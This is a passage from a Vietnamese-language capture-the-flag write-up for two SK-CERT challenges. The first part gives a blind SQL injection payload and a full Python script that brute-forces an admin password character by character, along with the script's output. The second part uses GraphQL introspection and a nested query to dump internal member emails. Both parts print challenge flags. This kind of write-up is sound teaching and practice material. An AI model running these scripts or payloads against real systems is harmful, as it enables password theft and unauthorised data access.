Hậu quả: Kẻ tấn công có thể truyền tham số `&rate=...` chứa mã độc SQL để thao túng câu truy vấn.

#### 2. Chiến lược Khai thác (Exploitation Strategy)
Bởi vì kết quả SQL trả về bị tính tổng (`SUM`) rồi gom vào biến `res` và hiển thị trên giao diện, ta không thể dùng `UNION SELECT` để in password ra trực tiếp. Thay vào đó, ta sử dụng kỹ thuật **Boolean-based Blind SQL Injection**.

Trong SQLite, ta có thể dùng câu lệnh `CASE WHEN ... THEN ... ELSE ... END` để tạo ra 2 kết quả toán học khác nhau phụ thuộc vào một mệnh đề logic. 

**Logic tấn công:**
1. Lấy mật khẩu của tài khoản `role='admin'` từ bảng `main_siteuser`.
2. Dùng hàm `substr()` cắt từng ký tự của mật khẩu.
3. So sánh ký tự đó với ký tự ta dự đoán.
   - Nếu **ĐÚNG**: Trả về một hệ số nhân cực lớn (VD: `987654321`). Lúc này `SUM(id) * 987654321` sẽ tạo ra một con số khổng lồ trên HTML.
   - Nếu **SAI**: Trả về số `0`. Kết quả trên web sẽ hiển thị giá trị `0`.

Cấu trúc Payload cho tham số `rate`:
```sql
(CASE WHEN substr((SELECT password FROM main_siteuser WHERE role='admin'), {vị_trí}, 1)='{ký_tự_đoán}' THEN 987654321 ELSE 0 END)
```

Do file `apps.py` vẫn giữ cấu hình `PRAGMA case_sensitive_like = ON;`, việc so sánh ký tự (hoa/thường) bằng SQL sẽ hoàn toàn chính xác.

#### 3. Full Exploit code (Python)

```python
import requests
import string
import base64
import re

url_repo = "http://exp.cybergame.sk:7003/repository"
url_admin = "http://exp.cybergame.sk:7003/admin"

# Password theo seed gồm chữ hoa, chữ thường và số
alphabet = string.ascii_letters + string.digits

s = requests.Session()

print("[*] Đang tính toán giá trị Baseline của hàm Aggregate...")

# Bước 1: Gửi 1 request với rate lớn để tìm ra con số lúc điều kiện TRUE
baseline_payload = "987654321"
params_baseline = {
    'aggregate': 'Convert',
    'field': 'id',
    'rate': baseline_payload
}

r_base = s.get(url_repo, params=params_baseline)
# Tìm con số rất lớn (trên 8 chữ số) trong kết quả trả về
match = re.search(r'(\d{8,})', r_base.text)

if not match:
    print("[-] Không tìm thấy baseline true value. CTF Instance có thể đang lỗi.")
    exit(1)

true_value = match.group(1)
print(f"[+] Baseline True Value: {true_value}")

password = ""
print("[*] Bắt đầu trích xuất mật khẩu Admin (SQL Injection)...")

# Bước 2: Brute-force 32 ký tự
for i in range(1, 33):
    char_found = False
    for c in alphabet:
        # SQL Injection Payload
        rate_payload = f"(CASE WHEN substr((SELECT password FROM main_siteuser WHERE role='admin'), {i}, 1)='{c}' THEN {baseline_payload} ELSE 0 END)"

        params = {
            'aggregate': 'Convert',
            'field': 'id',
            'rate': rate_payload
        }

        r = s.get(url_repo, params=params)

        # Nếu True Value xuất hiện trong HTML, chứng tỏ phép so sánh char đã đúng!
        if true_value in r.text:
            password += c
            print(f"[*] Password tìm được: {password}")
            char_found = True
            break

    if not char_found:
        print(f"[-] Không thể tìm thấy ký tự ở vị trí {i}.")
        break

print(f"\n[+] Mật khẩu Admin hoàn chỉnh: {password}")
print("[*] Đang truy cập /admin endpoint để nhặt cờ...")

# Bước 3: Build HTTP Basic Auth Header với mật khẩu vừa trích xuất
auth_str = f"Admin:{password}"
auth_b64 = base64.b64encode(auth_str.encode()).decode("utf-8")
headers = {
    "Authorization": f"Basic {auth_b64}"
}

r_admin = s.get(url_admin, headers=headers)

if "SK-CERT{" in r_admin.text:
    print("\n[+] THÀNH CÔNG! Flag của bạn:")
    flag = r_admin.text.split("SK-CERT{")[1].split("}")[0]
    print(f"SK-CERT{{{flag}}}")
else:
    print("[-] Lấy flag thất bại.")
```

```bash
[*] Đang tính toán giá trị Baseline của hàm Aggregate...
[+] Baseline True Value: 5925925926
[*] Bắt đầu trích xuất mật khẩu Admin (SQL Injection)...
[*] Password tìm được: e
[*] Password tìm được: eQ
[*] Password tìm được: eQv
...
[*] Password tìm được: eQvQE7Wdz6zKqcBLAfWzch33XE1aP6v
[*] Password tìm được: eQvQE7Wdz6zKqcBLAfWzch33XE1aP6vm

[+] Mật khẩu Admin hoàn chỉnh: eQvQE7Wdz6zKqcBLAfWzch33XE1aP6vm
[*] Đang truy cập /admin endpoint để nhặt cờ...

[+] THÀNH CÔNG! Flag của bạn:
SK-CERT{4ggr3g4t3_r4t3_t3mpl4t3_sqli}
```

> Flag: `SK-CERT{4ggr3g4t3_r4t3_t3mpl4t3_sqli}`
{: .prompt-flag }

> Ý nghĩa của flag: **Aggregate Rate Template SQLi** - Lỗi SQL Injection thông qua template của thuộc tính rate trong hàm Aggregate. Lỗi "Template String SQLi trong Django" là một lỗi rất phổ biến khi các lập trình viên cố gắng tự viết hàm tính toán riêng (`Func`, `Aggregate`). Họ cho rằng đã dùng ORM thì auto chống được SQLi. Bài này thực ra cũng không cần brute-force password để lấy flag nhưng mà lỡ dùng ở bài ormt2 nên xài luôn.

### **rEquestria - Lesson Zero**

- Mô tả: 

We've identified a website tied to a known suspicious group. Your first task is to perform an initial unauthenticated enumeration as we don't have the permission for authentication bypass yet.

Note: Fuzzing/bruteforcing/scanning the server using automated tools is not allowed and it will not help you to progress in the challenge

https://mail.equestriasociety.com/

- Attachments: 
- Cách giải:

Đầu tiên, chúng ta phân tích các dữ kiện từ mã nguồn và cấu trúc của trang web mục tiêu:
1. **Phân tích Client-side (Frontend Analysis):** Trang web là một ứng dụng Single Page Application (SPA) viết bằng React. Bằng cách phân tích tĩnh file JS bundle gốc (`/static/js/main.36c9c96c.js`), ta phát hiện endpoint giao tiếp chính của ứng dụng sử dụng GraphQL tại địa chỉ `https://mail.equestriasociety.com/graphql`.
2. **Thu thập thông tin qua GraphQL Introspection:** Hệ thống backend quên vô hiệu hóa tính năng Introspection. Tiến hành gửi một truy vấn Introspection chuyên sâu để kết xuất toàn bộ lược đồ cơ sở dữ liệu (Schema). Qua đó, ta biết được query `newsFeed` cho phép truy cập public (không cần xác thực), trong khi các query khác như `users` đều bị chặn.
3. **Phát hiện lỗ hổng BOLA (Broken Object Level Authorization):** Phân tích các tham số lồng nhau từ Schema, ta nhận ra một điểm yếu trong logic phân quyền. Thay vì gọi trực tiếp danh sách người dùng, ta có thể đi đường vòng thông qua các bài viết public: `newsFeed` -> `author` -> `subOrganization` -> `members`.
4. **Khai thác Graph Traversal (Duyệt đồ thị):** Sử dụng một đoạn mã Python, ta gửi truy vấn lồng nhau (Nested Query) để vượt qua xác thực.
5. **Trích xuất Flag:** Do thiếu kiểm tra phân quyền ở các đối tượng lồng nhau, máy chủ trả về toàn bộ danh sách thành viên nội bộ. Rà soát dữ liệu JSON thu được, trong nhóm tổ chức `volunteer_outreach`, có một tài khoản với tên `Flaggie Flag`. Địa chỉ email của tài khoản này chứa trực tiếp chuỗi Flag của thử thách.
6. **Script Exploit:**

```python 
import requests
import json

url = "https://mail.equestriasociety.com/graphql"
headers = {"Content-Type": "application/json"}

# Truy vấn lồng nhau (Nested Query) để bypass xác thực
query_nested_users = """
query {
  newsFeed {
    title
    author {
      name
      role
      subOrganization {
        name
        members {
          id
          name
          email
          role
        }
      }
    }
  }
}
"""

print("[*] Đang thực hiện GraphQL Graph Traversal Attack...")
try:
    response = requests.post(url, json={"query": query_nested_users}, headers=headers)
    if response.status_code == 200:
        data = response.json()
        if "errors" in data:
            print("[-] Bị lỗi:")
            print(data["errors"][0]["message"])
        else:
            print("[+] Thành công Bypass! Dữ liệu thu được:")
            print(json.dumps(data['data'], indent=2))

            print("\n[*] GỢI Ý: Hãy đọc kỹ danh sách 'members' trả về.")
            print("[*] Biết đâu có một user tên là Flag, email chứa Flag, hoặc một Admin ẩn!")
    else:
        print(f"[-] Server trả về mã lỗi: {response.status_code}")
except Exception as e:
    print(f"[-] Lỗi kết nối: {e}")
```

```bash
[*] Đang thực hiện GraphQL Graph Traversal Attack...
[+] Thành công Bypass! Dữ liệu thu được:
{
  "newsFeed": [
    {
      "author": {
        "name": "Luna Starlight",
        "role": 2,
        "subOrganization": {
          "members": [
            {
              "email": "luna.starlight@equestriasociety.com",
              "id": "c04a5f99-b32d-41af-a981-fdf3f2dcde63",
              "name": "Luna Starlight",
              "role": 2
            },
            {
              "email": "luna.belle@equestriasociety.com",
              "id": "d7b0c464-d1f3-4202-8cf6-e3d4469fc0b0",
              "name": "Luna Belle",
              "role": 2
            }
          ],
          "name": "moon_council"
        }
      },
      "title": "Welcome to EFS Messaging!"
    },
    {
      "author": {
        "name": "Luna Starlight",
        "role": 2,
        "subOrganization": {
          "members": [
            {
              "email": "luna.starlight@equestriasociety.com",
              "id": "c04a5f99-b32d-41af-a981-fdf3f2dcde63",
              "name": "Luna Starlight",
              "role": 2
            },
            {
              "email": "luna.belle@equestriasociety.com",
              "id": "d7b0c464-d1f3-4202-8cf6-e3d4469fc0b0",
              "name": "Luna Belle",
              "role": 2
            }
          ],
          "name": "moon_council"
        }
      },
      "title": "Children's Hospital Volunteer Success!"
    },
    {
      "author": {
        "name": "Rose Garden",
        "role": 1,
        "subOrganization": {
          "members": [
            {
              "email": "rose.garden@equestriasociety.com",
              "id": "7c57adc4-da3e-49a5-8a02-93bdfdf13793",
              "name": "Rose Garden",
              "role": 1
            },
            {
              "email": "friends@equestriasociety.com",
              "id": "93575134-30c5-4387-9edc-1873412092ac",
              "name": "EFS External Contact",
              "role": 0
            }
          ],
          "name": "public_relations"
        }
      },
      "title": "EFS Featured in Local News!"
    },
    {
      "author": {
        "name": "Starswirl Helper",
        "role": 2,
        "subOrganization": {
          "members": [
            {
              "email": "starswirl.helper@equestriasociety.com",
              "id": "45f9de36-45f6-4434-a969-f29790f84f89",
              "name": "Starswirl Helper",
              "role": 2
            },
            {
              "email": "moon.dancer@equestriasociety.com",
              "id": "8707bfbc-9d4d-410d-9995-645207b01eea",
              "name": "Moon Dancer",
              "role": 1
            },
            {
              "email": "twilight.scholar@equestriasociety.com",
              "id": "080036ee-5236-4908-9b65-f1c643c1ce99",
              "name": "Twilight Scholar",
              "role": 0
            },
            {
              "email": "fluttershy.quiet@equestriasociety.com",
              "id": "933e9309-9356-4847-8aaf-8fba198a26f7",
              "name": "Fluttershy Quiet",
              "role": 0
            },
            {
              "email": "SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}@lol.com",
              "id": "c7f09c57-f562-48a0-b5bc-419becfce977",
              "name": "Flaggie Flag",
              "role": 2
            }
          ],
          "name": "volunteer_outreach"
        }
      },
      "title": "Security Reminder: Protect Your Account"
    }
  ]
}

[*] GỢI Ý: Hãy đọc kỹ danh sách 'members' trả về.
[*] Biết đâu có một user tên là Flag, email chứa Flag, hoặc một Admin ẩn!
```

> Flag: `SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}`
{: .prompt-flag }
